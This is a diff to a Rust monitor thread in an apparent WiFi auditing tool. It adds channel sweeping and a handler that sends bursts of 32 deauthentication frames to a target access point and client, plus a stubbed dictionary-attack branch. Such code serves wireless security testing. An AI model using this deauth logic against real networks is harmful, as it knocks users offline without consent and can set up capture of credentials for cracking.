@@ -1,10 +1,10 @@
-use core::time;
-use std::collections::HashMap;
+use crate::ipc::{IPCMessage,IPC,IOCommand};
+use wpa::{NetworkInfo,AttackInfo,DeauthAttack,DictionaryAttack};
 use std::sync::mpsc::{Sender,Receiver};
-use wpa::NetworkInfo;
-use aux::{IPCMessage,IPC,IOCommand};
+use std::collections::HashMap;
+use core::time;
 
-const MAX_CHANNEL: usize = 11;
+const MAX_CHANNEL: usize = 13;
 pub type MonitorSender = Sender<IPCMessage<HashMap<String,NetworkInfo>>>;
 pub type MonitorReciever = Receiver<IPCMessage<HashMap<String,NetworkInfo>>>;
 type Bssid = String;
@@ -32,10 +32,11 @@ impl MonitorThread{
     pub fn run(&mut self){
         let mut channel = 0;
         loop{
-            if self.sweep_mode{
+            if self.sweep_mode{ //iterate channel if sweep mode is on
                 channel = aux::modulos((channel+1) as i32,(MAX_CHANNEL+1) as i32) as u8;
                 wlan::switch_iface_channel(&self.iface, channel);
             }
+            //listen for new frames
             match wpa::listen_and_collect(&self.iface, time::Duration::from_secs(1)){
                 Ok(captured_msgs) =>{
                     for msg in captured_msgs{
@@ -58,21 +59,40 @@ impl MonitorThread{
             }
             //send back network information
             self.channels.tx.send(IPCMessage::Message(self.networks.clone()));
-            //check if got EndCommunication message
+
+            //check if got new message
             if let Ok(msg) = self.channels.rx.try_recv(){
-                if let IPCMessage::EndCommunication = msg{
-                    return;
-                }else if let IPCMessage::IOCommand(cmd)  = msg{
-                    match cmd{
-                        IOCommand::Sweep =>{
-                            self.sweep_mode = true;
-                        },
-                        IOCommand::ChangeChannel(c) =>{
-                            wlan::switch_iface_channel(&self.iface, c);
-                            self.sweep_mode = false;
-                        },
-                        _ =>{}//do nothing
-                    }
+                match msg{
+                    IPCMessage::IOCommand(cmd) =>{
+                        match cmd{
+                            IOCommand::Sweep =>{
+                                self.sweep_mode = true;
+                            },
+                            IOCommand::ChangeChannel(c) =>{
+                                wlan::switch_iface_channel(&self.iface, c);
+                                self.sweep_mode = false;
+                            },
+                            _ =>{}//do nothing
+                        }
+                    },
+                    IPCMessage::Attack(attack_info) =>{
+                        match attack_info{
+                            AttackInfo::DeauthAttack(attack) =>{
+                                wlan::switch_iface_channel(&self.iface, attack.station_channel);
+                                for _ in 0..32 {
+                                    wpa::send_deauth(&self.iface, &attack.bssid, attack.client.clone());
+                                }
+                                wlan::switch_iface_channel(&self.iface,channel);
+                            },
+                            AttackInfo::DictionaryAttack(attack) =>{
+                                todo!();
+                            }
+                        }
+                    },
+                    IPCMessage::EndCommunication => {
+                        return;
+                    },
+                    _=>{},
                 }
             }
         }
